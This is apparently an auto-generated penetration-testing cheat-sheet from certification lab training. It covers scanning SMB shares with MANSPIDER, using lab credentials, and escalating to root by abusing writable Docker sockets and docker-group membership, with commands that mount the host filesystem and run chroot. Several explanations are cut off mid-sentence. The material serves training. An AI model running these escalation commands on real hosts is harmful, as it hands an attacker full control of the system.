# Docker

% docker, container, cpts

## Docker - Docker - Docker - Docker - manspider
#cat/ATTACK #cpts
If we don’t have access to a domain-joined computer, or simply prefer to search for files remotely, tools like MANSPIDER allow us to scan SMB shares from Linux. It's best to run [MANSPIDER](https://github.com/blacklanter

```
docker run --rm -v ./manspider:/root/.manspider blacklanternsecurity/manspider 10.129.234.121 -c 'passw' -u 'mendres' -p 'Inlanefreight2025!'
```

## Docker - Docker - Docker - Docker - docker-sockets
#cat/ATTACK #cpts
A Docker socket or Docker daemon socket is a special file that allows us and processes to communicate with the Docker daemon. This communication occurs either through a Unix socket or a network socket, depending on the c

```
:~/app$ ls -al
```

## Docker - Docker - Docker - Docker - docker-sockets-2
#cat/ATTACK #cpts
We can create our own Docker container that maps the host’s root directory (`/`) to the `/hostsystem` directory on the container. With this, we will get full access to the host system. Therefore, we must map these direct

```
:/app$ /tmp/docker -H unix:///app/docker.sock run --rm -d --privileged -v /:/hostsystem main_app
```

## Docker - Docker - Docker - Docker - docker-sockets-3
#cat/ATTACK #cpts
We can create our own Docker container that maps the host’s root directory (`/`) to the `/hostsystem` directory on the container. With this, we will get full access to the host system. Therefore, we must map these direct

```
:~/app$ /tmp/docker -H unix:///app/docker.sock ps
```

## Docker - Docker - Docker - Docker - docker-group
#cat/ATTACK #cpts
To gain root privileges through Docker, the user we are logged in with must be in the `docker` group. This allows him to use and control the Docker daemon.

```
:~$ id
```

## Docker - Docker - Docker - Docker - docker-group-2
#cat/ATTACK #cpts
Alternatively, Docker may have SUID set, or we are in the Sudoers file, which permits us to run `docker` as root. All three options allow us to work with Docker to escalate our privileges. Most hosts have a direct intern

```
:~$ docker image ls
```

## Docker - Docker - Docker - Docker - docker-socket
#cat/ATTACK #cpts
A case that can also occur is when the Docker socket is writable. Usually, this socket is located in `/var/run/docker.sock`. However, the location can understandably be different. Because basically, this can only be writ

```
:~$ docker -H unix:///var/run/docker.sock run -v /:/mnt --rm -it ubuntu chroot /mnt bash
```

## Docker - Docker - Docker - Docker - docker-socket-2
#cat/ATTACK #cpts
A case that can also occur is when the Docker socket is writable. Usually, this socket is located in `/var/run/docker.sock`. However, the location can understandably be different. Because basically, this can only be writ

```
:~# ls -l
```

## Docker - Docker - Docker - Docker - escalate-the-privileges-on-the-target-and-obtain-the-flagtxt-in-the-ro
#cat/ATTACK #cpts
```
shell-session
```

## Docker - Docker - Docker - Docker - escalate-the-privileges-on-the-target-and-obtain-the-flagtxt-in-the-ro-2
#cat/ATTACK #cpts
Confirming the group membership, students now need to enumerate available docker images:

```
docker image ls
```

## Docker - Docker - Docker - Docker - escalate-the-privileges-on-the-target-and-obtain-the-flagtxt-in-the-ro-3
#cat/ATTACK #cpts
Discovering the `ubuntu` image, students need to utilize the docker socket located at `/var/run/docker.sock` to escalate privileges:

```
docker -H unix:///var/run/docker.sock run -v /:/mnt --rm -it ubuntu chroot /mnt bash
```

## Docker - Docker - Docker - Docker - catapwn
#cat/ATTACK #cpts
Rebuild les images après chaque maj

```
docker compose build
```

